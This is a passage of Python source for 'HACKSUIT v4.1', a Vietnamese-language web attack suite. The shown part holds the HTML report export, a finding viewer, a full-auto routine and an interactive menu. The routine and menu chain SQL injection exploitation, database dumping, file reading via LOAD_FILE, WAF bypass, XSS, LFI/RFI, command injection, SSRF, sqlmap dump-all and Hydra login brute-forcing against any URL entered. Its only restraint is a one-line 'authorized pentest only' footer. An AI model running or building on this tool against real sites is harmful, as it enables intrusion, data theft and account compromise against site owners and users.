  <p class="text-muted mt-3 text-center">Generated by HACKSUIT v4.1 — chỉ dùng cho pentest được ủy quyền</p>
</div></body></html>"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    log(f"Đã xuất báo cáo HTML: {path}", "OK")
    try: webbrowser.open(f"file://{os.path.abspath(path)}")
    except Exception: pass
    return path

# ============================================================
#                    MAIN / MENU
# ============================================================
engine = None

def pick_target(targets):
    for i, t in enumerate(targets):
        print(f"  [{i}] {t['method']:4} {t.get('param','-'):15} {t.get('type','')}")
    idx = input("Số thứ tự (default 0): ").strip()
    try: return targets[int(idx) if idx else 0]
    except (IndexError, ValueError): return targets[0]

def ask_url():
    if not engine.url:
        u = input(f"{C['Y']}Nhập URL đích (vd: http://target.com/page.php?id=1): {C['W']}").strip()
        if not u: return False
        if not u.startswith(("http://","https://")): u = "http://" + u
        engine.url = u
        log(f"Target: {u}", "OK")
    return True

def show_findings():
    if not engine.findings:
        log("Chưa có findings.", "WARN"); return
    print(f"\n{C['G']}--- FINDINGS ({len(engine.findings)}) ---{C['W']}")
    for i, f in enumerate(engine.findings):
        print(f"  [{i}] {f['method']:4} {f.get('type','?'):15} {f.get('param','-'):15} {f['url'][:60]}")
        if f.get("payload"): print(f"      payload: {f['payload'][:80]}")

def run_full_auto():
    log("=== CHẠY TẤT CẢ TỰ ĐỘNG ===", "OK")
    # Recon
    dir_fuzz(engine); subdomain_enum(engine); cms_scan(engine)
    # Vuln scan
    xss_scan(engine); lfi_scan(engine)
    ssrf_scan(engine); csrf_check(engine)
    ts = engine.extract_params()
    for t in ts:
        res = engine.sqli_detect(t)
        if res:
            t.update(res); engine.findings.append(t)
            engine.dbms = engine.dbms or res["dbms"]
            log(f"[!] SQLi: {t['param']}", "VULN")
    # Nikto nền
    nikto_proc = None
    if shutil.which("nikto"):
        nikto_proc = subprocess.Popen(
            ["nikto","-h",f"{urlparse(engine.url).scheme}://{urlparse(engine.url).netloc}","-nointeractive"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Nikto chạy nền...", "NIKTO")
    # sqlmap pipeline
    sqlmap_pipeline(engine)
    show_findings()
    if nikto_proc:
        try: nikto_proc.wait(timeout=1200); log("Nikto xong.", "OK")
        except subprocess.TimeoutExpired: nikto_proc.kill()
    export_html_report(engine, target_url=engine.url)
    log("=== HOÀN TẤT ===", "OK")

def main():
    global PROXY, engine
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description="HACKSUIT v4.1 FULL (URL tùy chọn — nhập trong menu)")
    parser.add_argument("url", nargs="?", default=None)
    parser.add_argument("-c", "--cookie")
    parser.add_argument("-p", "--proxy")
    args = parser.parse_args()
    PROXY = args.proxy
    engine = Engine(args.url, cookie=args.cookie)
    banner()
    for tool in ["nikto","sqlmap","nmap","hydra"]:
        tool_exists(tool)

    while True:
        print(f"""
{C['G']}========== HACKSUIT v4.1 FULL — MENU =========={C['W']}
 Target: {engine.url or f'{C[chr(89)]}chưa đặt{C[chr(87)]}'}
--- Thiết lập ---
 [99] Đặt/đổi URL đích              [2]  Xem findings
--- SQLi (engine riêng) ---
 [1]  Quét SQLi toàn params
 [3]  Full auto-exploit SQLi        [4]  DB info
 [5]  Liệt kê databases             [6]  Liệt kê tables
 [7]  Liệt kê columns               [8]  DUMP data
 [9]  Boolean-blind                 [10] Đọc file (LOAD_FILE)
 [11] WAF bypass                    [12] Payload thủ công
--- Khai thác khác ---
 [13] XSS Scanner                   [14] LFI / RFI Scanner
 [15] Command Injection (RCE)       [27] SSRF Scanner (OOB webhook)
 [28] CSRF Token Check
--- Recon ---
 [16] Directory Fuzzing             [17] Port Scan (nmap)
 [18] Subdomain Enumeration         [19] CMS/Tech Detection
--- Công cụ ngoài tích hợp ---
 [20] Nikto scan nhanh              [21] Nikto full + HTML report
 [22] sqlmap auto-detect            [23] sqlmap FULL PIPELINE (dump-all)
 [24] Brute-force Login (Hydra)
--- Tổng hợp & Báo cáo ---
 [25] CHẠY TẤT CẢ tự động + xuất HTML
 [29] 📄 Xuất báo cáo HTML (tất cả findings)
 [26] Xem báo cáo reports/
 [0]  Thoát""")
        ch = input("Chọn: ").strip()
        need_url = ch in ("1","13","14","15","16","17","18","19","20","21","22","25","27","28","24")
        if need_url and not ask_url(): continue

        if ch == "99":
            engine.url = None; ask_url()

        elif ch == "1":
            ts = engine.extract_params()
            log(f"{len(ts)} param(s)", "OK")
            engine.findings = [f for f in engine.findings if not f.get("type","").startswith(("error","boolean","time"))]
            for t in ts:
                res = engine.sqli_detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] SQLi: {t['param']} → {res['type']} ({res['dbms']})", "VULN")
            if not any(f.get("type","").startswith(("error","boolean","time")) for f in engine.findings):
                log("Engine không thấy SQLi. Thử [22] cho sqlmap tự detect.", "WARN")

        elif ch == "2": show_findings()

        elif ch in ("3","4","5","6","7","8","9","10","11","12"):
            sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
            if not sqli_f: log("Chưa có SQLi findings — chạy [1].", "WARN"); continue
            t = sqli_f[0] if len(sqli_f) == 1 else pick_target(sq
